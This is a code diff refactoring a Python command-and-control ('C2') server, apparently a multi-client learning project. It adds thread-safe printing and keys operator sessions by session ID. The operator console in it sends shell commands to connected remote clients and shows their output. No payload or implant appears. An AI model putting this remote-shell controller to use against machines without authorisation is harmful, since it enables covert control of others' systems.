@@ -28,6 +28,9 @@ from server.session import ClientSession
 from server.session_manager import SessionManager
 import ssl
 
+# Global lock for thread-safe printing (prevents interleaved output)
+print_lock = threading.Lock()
+
 
 def generate_session_id() -> str:
     """
@@ -240,10 +243,11 @@ def handle_registration(client_socket: socket.socket, session_id: str, log: logg
             return None
 
         # Display registration info
-        print(f"[+] Client registered successfully!")
-        print(f"    Client ID: {client_id}")
-        print(f"    Timestamp: {timestamp}")
-        print()
+        with print_lock:
+            print(f"[+] Client registered successfully!")
+            print(f"    Client ID: {client_id}")
+            print(f"    Timestamp: {timestamp}")
+            print()
 
         # LOG: Successful registration
         log.info(f"[{session_id}] Client registered successfully: {client_id}")
@@ -394,7 +398,7 @@ def client_handler(
             session.connected = False
 
             # Remove from session manager
-            removed = session_manager.remove_session(session.client_id)
+            removed = session_manager.remove_session(session.session_id)
             if removed:
                 log.info(f"[{session_id}] Session removed from manager: {session.client_id}")
                 print(f"[-] Client {session.client_id} disconnected")
@@ -419,50 +423,52 @@ def display_results(result_message: dict):
     Args:
         result_message: The result message dictionary from client
     """
-    print()
-    print("-" * 60)
+    with print_lock:
+        print()
+        print("-" * 60)
 
-    # Display command info
-    command = result_message.get('command', 'Unknown')
-    return_code = result_message.get('return_code', -1)
-    print(f"Command: {command}")
-    print(f"Return Code: {return_code}")
-    print("-" * 60)
+        # Display command info
+        command = result_message.get('command', 'Unknown')
+        return_code = result_message.get('return_code', -1)
+        print(f"Command: {command}")
+        print(f"Return Code: {return_code}")
+        print("-" * 60)
 
-    # Display stdout
-    stdout = result_message.get('stdout', '')
-    if stdout:
-        print("\n[STDOUT]:")
-        print(stdout)
-    else:
-        print("\n[STDOUT]: (empty)")
+        # Display stdout
+        stdout = result_message.get('stdout', '')
+        if stdout:
+            print("\n[STDOUT]:")
+            print(stdout)
+        else:
+            print("\n[STDOUT]: (empty)")
 
-    # Display stderr
-    stderr = result_message.get('stderr', '')
-    if stderr:
-        print("\n[STDERR]:")
-        print(stderr)
-    else:
-        print("\n[STDERR]: (empty)")
+        # Display stderr
+        stderr = result_message.get('stderr', '')
+        if stderr:
+            print("\n[STDERR]:")
+            print(stderr)
+        else:
+            print("\n[STDERR]: (empty)")
 
-    print("-" * 60)
-    print()
+        print("-" * 60)
+        print()
 
 
 def display_help():
     """
     Display available operator commands (Level 3: Multi-client version).
     """
-    print()
-    print("Available Commands:")
-    print("  sessions           - List all active client sessions")
-    print("  use <client_id>    - Switch to a specific client session")
-    print("  help               - Show this help message")
-    print("  exit, quit         - Close all connections and exit server")
-    print()
-    print("When a client is selected (using 'use <client_id>'):")
-    print("  Any other input will be sent as a shell command to that client")
-    print()
+    with print_lock:
+        print()
+        print("Available Commands:")
+        print("  sessions             - List all active client sessions")
+        print("  use <session_id>     - Switch to a specific session (e.g., 'use SESSION-20250126153045-a1b2')")
+        print("  help                 - Show this help message")
+        print("  exit, quit           - Close all connections and exit server")
+        print()
+        print("When a session is selected (using 'use <session_id>'):")
+        print("  Any other input will be sent as a shell command to that client")
+        print()
 
 
 def operator_interface(
@@ -497,13 +503,20 @@ def operator_interface(
     print("Type 'sessions' to list connected clients")
     print()
 
-    current_client_id = None  # Track which client is currently active
+    current_session_id = None  # Track which session is currently active
 
     try:
         while not shutdown_event.is_set():
-            # Build prompt based on whether a client is selected
-            if current_client_id:
-                prompt = f"C2 [{current_client_id}]> "
+            # Build prompt based on whether a session is selected
+            if current_session_id:
+                # Get the session to show client_id in prompt
+                active_session = session_manager.get_session_by_session_id(current_session_id)
+                if active_session:
+                    prompt = f"C2 [{active_session.client_id}|{current_session_id}]> "
+                else:
+                    # Session no longer exists
+                    current_session_id = None
+                    prompt = "C2> "
             else:
                 prompt = "C2> "
 
@@ -535,73 +548,74 @@ def operator_interface(
             elif command.lower() == 'sessions':
                 # List all active sessions
                 sessions = session_manager.list_sessions()
-                print()
-                print(f"Active Sessions ({len(sessions)}):")
-                print("-" * 80)
+                with print_lock:
+                    print()
+                    print(f"Active Sessions ({len(sessions)}):")
+                    print("-" * 100)
 
-                if not sessions:
-                    print("  (no active sessions)")
-                else:
-                    for s in sessions:
-                        status = "CONNECTED" if s['connected'] else "DISCONNECTED"
-                        active_marker = " <-- ACTIVE" if s['client_id'] == current_client_id else ""
-                        print(f"  [{status}] {s['client_id']:<20} {s['address']:<21} ({s['session_id']}){active_marker}")
+                    if not sessions:
+                        print("  (no active sessions)")
+                    else:
+                        for s in sessions:
+                            status = "CONNECTED" if s['connected'] else "DISCONNECTED"
+                            active_marker = " <-- ACTIVE" if s['session_id'] == current_session_id else ""
+                            print(f"  [{status}] Session: {s['session_id']:<30} | Client: {s['client_id']:<20} | {s['address']:<21}{active_marker}")
 
-                print("-" * 80)
-                print()
+                    print("-" * 100)
+                    print()
                 main_logger.info(f"[MAIN] Operator listed sessions (count: {len(sessions)})")
                 continue
 
             elif command.lower().startswith('use '):
-                # Switch to a specific client
-                target_client_id = command[4:].strip()
+                # Switch to a specific session
+                target_session_id = command[4:].strip()
 
-                if not target_client_id:
-                    print("[!] ERROR: Please specify a client_id (e.g., 'use LAPTOP-ABC')")
+                if not target_session_id:
+                    print("[!] ERROR: Please specify a session_id (e.g., 'use SESSION-20250126153045-a1b2')")
                     continue
 
                 # Verify the session exists
-                session = session_manager.get_session(target_client_id)
+                session = session_manager.get_session_by_session_id(target_session_id)
 
                 if session is None:
-                    print(f"[!] ERROR: No session found for client '{target_client_id}'")
-                    print("[*] Use 'sessions' command to see available clients")
+                    print(f"[!] ERROR: No session found with ID '{target_session_id}'")
+                    print("[*] Use 'sessions' command to see available sessions")
                     continue
 
                 if not session.connected:
-                    print(f"[!] WARNING: Client '{target_client_id}' is disconnected")
+                    print(f"[!] WARNING: Session '{target_session_id}' is disconnected")
                     print("[*] You can select it, but commands will fail")
 
-                # Switch to this client
-                current_client_id = target_client_id
-                print(f"[*] Switched to session: {current_client_id}")
-                main_logger.info(f"[MAIN] Operator switched to session: {current_client_id}")
+                # Switch to this session
+                current_session_id = target_session_id
+                print(f"[*] Switched to session: {current_session_id} (Client: {session.client_id})")
+                main_logger.info(f"[MAIN] Operator switched to session: {current_session_id}")
                 continue
 
             else:
-                # Regular command - send to active client
-                if not current_client_id:
+                # Regular command - send to active session
+                if not current_session_id:
                     print("[!] ERROR: No active session selected")
-                    print("[*] Use 'sessions' to list clients, then 'use <client_id>' to select one")
+                    print("[*] Use 'sessions' to list sessions, then 'use <session_id>' to select one")
                     continue
 
                 # Get the session
-                session = session_manager.get_session(current_client_id)
+                session = session_manager.get_session_by_session_id(current_session_id)
 
                 if session is None:
-                    print(f"[!] ERROR: Session '{current_client_id}' no longer exists")
-                    print("[*] Client may have disconnected. Use 'sessions' to see active clients")
-                    current_client_id = None
+                    print(f"[!] ERROR: Session '{current_session_id}' no longer exists")
+                    print("[*] Client may have disconnected. Use 'sessions' to see active sessions")
+                    current_session_id = None
                     continue
 
                 if not session.connected:
-                    print(f"[!] ERROR: Client '{current_client_id}' is disconnected")
-                    current_client_id = None
+                    print(f"[!] ERROR: Session '{current_session_id}' is disconnected")
+                    current_session_id = None
                     continue
 
                 # Queue the command for the client handler thread
                 session.command_queue.put(command)
-                main_logger.info(f"[MAIN] Command queued for {current_client_id}: {command}")
+                main_logger.info(f"[MAIN] Command queued for session {current_session_id} (client: {session.client_id}): {command}")
 
                 # Note: Results will be displayed by the client_handler thread
                 # No need to wait here - the handler thread prints results directly
@@ -699,10 +713,10 @@ def main():
 
         # Close all client connections
         print("[*] Closing all client connections...")
-        client_ids = session_manager.get_all_client_ids()
+        session_ids = session_manager.get_all_session_ids()
 
-        for client_id in client_ids:
-            session = session_manager.get_session(client_id)
+        for session_id in session_ids:
+            session = session_manager.get_session_by_session_id(session_id)
             if session:
                 try:
                     # Mark as disconnected
@@ -710,9 +724,9 @@ def main():
 
                     # Close socket
                     session.client_socket.close()
-                    main_logger.info(f"[MAIN] Closed connection to {client_id}")
+                    main_logger.info(f"[MAIN] Closed connection to session {session_id} (client: {session.client_id})")
                 except Exception as e:
-                    main_logger.error(f"[MAIN] Error closing connection to {client_id}: {e}")
+                    main_logger.error(f"[MAIN] Error closing connection to session {session_id}: {e}")
 
         # Give handler threads time to exit gracefully
         print("[*] Waiting for handler threads to finish...")
